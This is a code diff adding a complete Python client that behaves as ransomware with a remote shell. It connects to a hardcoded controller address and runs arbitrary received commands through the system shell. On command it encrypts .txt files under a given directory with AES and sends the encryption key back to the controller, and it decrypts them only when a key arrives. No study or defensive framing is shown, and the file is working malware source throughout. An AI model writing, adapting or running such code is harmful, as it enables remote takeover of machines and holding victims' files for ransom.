@@ -1,0 +1,152 @@
+import base64
+import os
+import socket
+import subprocess
+import platform
+import time
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.backends import default_backend
+
+def find_txt_files(directory):
+    txt_files = []
+    try:
+        for root, dirs, files in os.walk(directory):  
+            for file in files:
+                if file.endswith('.txt'):
+                    txt_files.append(os.path.join(root, file))
+    except Exception as e:
+        return [], f"Error searching directory: {e}"
+
+    return txt_files, None
+
+def encrypt_file(file_path, key):
+    try:
+        with open(file_path, 'rb') as f:
+            data = f.read()
+
+        padder = padding.PKCS7(128).padder()
+        padded_data = padder.update(data) + padder.finalize()
+
+        iv = os.urandom(16)
+        
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+
+        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
+
+        with open(file_path, 'wb') as f:
+            f.write(iv + encrypted_data)
+        
+        return True
+    except Exception as e:
+        return False, str(e)
+
+def decrypt_file(file_path, key):
+    try:
+        with open(file_path, 'rb') as f:
+            iv = f.read(16)  
+            encrypted_data = f.read()  
+
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+        decryptor = cipher.decryptor()
+
+        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
+
+        unpadder = padding.PKCS7(128).unpadder() 
+        original_data = unpadder.update(decrypted_data) + unpadder.finalize()
+
+        with open(file_path, 'wb') as f:
+            f.write(original_data)
+
+        return True
+    except Exception as e:
+        return False, str(e)
+
+def start_client():
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.connect(('192.168.30.19', 9999))  
+    current_dir = os.getcwd()
+    client_socket.send(platform.system().encode("utf-8"))
+
+    files_to_encrypt = [] 
+
+    try:
+        while True:
+            command = client_socket.recv(1024).decode()
+
+            if command.lower() == 'exit':
+                break
+
+            elif command.lower() == 'encrypt':
+                   directory = client_socket.recv(1024).decode()
+                   files_to_encrypt, error = find_txt_files(directory)
+                   if files_to_encrypt:
+                        
+                        client_socket.send(f"Found {len(files_to_encrypt)} files: {files_to_encrypt}".encode("utf-8"))
+                   else:
+                        client_socket.send(f"No .txt files found or error: {error}".encode("utf-8"))
+
+                   key = os.urandom(32)
+                   print(key)
+                   encrypted_files_count = 0
+                   for file_path in files_to_encrypt:
+                    result = encrypt_file(file_path, key)
+                    if isinstance(result, tuple):
+                        success, error = result
+                        client_socket.send(f"Failed to encrypt {file_path}: {error}".encode("utf-8"))
+                        break
+                    elif result:
+                        encrypted_files_count += 1
+
+                    if encrypted_files_count > 0:
+                        # client_socket.send(b"KEY") 
+                        # client_socket.send(key)  
+                        # from mark
+                        client_socket.send(b"KEY") 
+                        encoded_key = base64.b64encode(key)  # Encode the key in Base64
+                        client_socket.send(encoded_key)  
+                    else:
+                        client_socket.send(b"NO_KEY")  
+
+            elif command.lower() == 'decrypt':
+                key = client_socket.recv(32)
+                decrypted_files_count = 0
+                for file_path in files_to_encrypt:
+                    success, error = decrypt_file(file_path, key)
+                    if success:
+                        decrypted_files_count += 1
+                    else:
+                        client_socket.send(f"Error decrypting {file_path}: {error}".encode("utf-8"))
+                        break
+
+                client_socket.send(f"Decrypted {decrypted_files_count} files.".encode("utf-8"))
+
+            elif command.startswith("cd"):
+                target_dir = command.split(" ", 1)[1]
+                new_dir = os.path.abspath(os.path.join(current_dir, target_dir)) 
+
+                if os.path.isdir(new_dir): 
+                    current_dir = new_dir  
+                    client_socket.send(f"Changed directory to {current_dir}".encode("utf-8"))
+                else:
+                    client_socket.send(f"Error: Directory '{target_dir}' does not exist.".encode("utf-8"))
+
+            elif command.lower() == "pwd":
+                client_socket.send(f"Current directory: {current_dir}".encode("utf-8"))
+
+            else:
+                try:
+                    output = subprocess.check_output(command, shell=True, cwd=current_dir, stderr=subprocess.STDOUT)
+                    client_socket.send(output)
+                except Exception as e:
+                    client_socket.send(f"Error executing command: {str(e)}".encode("utf-8"))
+
+    except Exception as e:
+        pass
+
+    finally:
+        client_socket.close()
+
+if __name__ == "__main__":
+    start_client()
